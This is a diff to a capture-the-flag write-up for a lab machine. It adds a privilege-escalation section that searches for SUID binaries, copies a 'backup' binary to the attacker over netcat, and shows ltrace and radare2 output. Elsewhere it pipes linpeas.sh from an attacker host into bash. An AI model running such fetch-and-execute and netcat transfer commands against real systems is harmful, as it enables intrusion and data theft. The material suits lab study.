@@ -58,7 +58,7 @@ I cannot read the user flag as mark, what if I try to login as tom
 mark@node:/home/tom$ cat user.txt
 cat: user.txt: Permission denied
 I need a way to escalate privileges to tom. I like using the linux privilege escalation script to check what I can find. So I open up a local server
-python -m http.server and curl http://10.10.14.13:8000/linpeas.sh | bash
+python3 -m http.server and curl http://10.10.14.13:8000/linpeas.sh | bash
 
 ps aux  | grep tom
 tom       1219  0.0  5.0 1008568 38024 ?       Ssl  11:28   0:03 /usr/bin/node /var/scheduler/app.js
@@ -87,7 +87,22 @@ tom@node:~$ cat user.txt
 cat user.txt
 e1156acc3574e04b06908ecf76be91b1
 ===================Priv Escalation==================
-
+Of interest is this backup file : -rwsr-xr-- 1 root admin 16484 Sep  3  2017 /usr/local/bin/backup
+So I attempt to sudo the file but tom sudo password is required. The one we already have does not work.
+OR
+We search for the files with setuid bit : find / -perm -u=s 2>/dev/null                
+/usr/local/bin/backup
+Checking the file : file /usr/local/bin/backup, we realize it is an ELF and so we download it for further analysis.
+Sending machine : nc 10.10.14.13 1112 < /usr/local/bin/backup
+Listening machine : nc -lvnp 1112 > backup
+Debugging the binary using ltrace : ltrace ./backup
+_libc_start_main(0x80489fd, 1, 0xfff9f584, 0x80492c0 <unfinished ...>
+geteuid()                                                                                   = 0
+setuid(0)                                                                                   = 0
+exit(1 <no return ...>
++++ exited (status 1) +++
+Reverse engineering with radare 2 : r2 backup
+Followed by : aaa > afl > vvv
 
 References:
 1. https://github.com/appsecco/vulnerable-apps/tree/master/node-reverse-shell
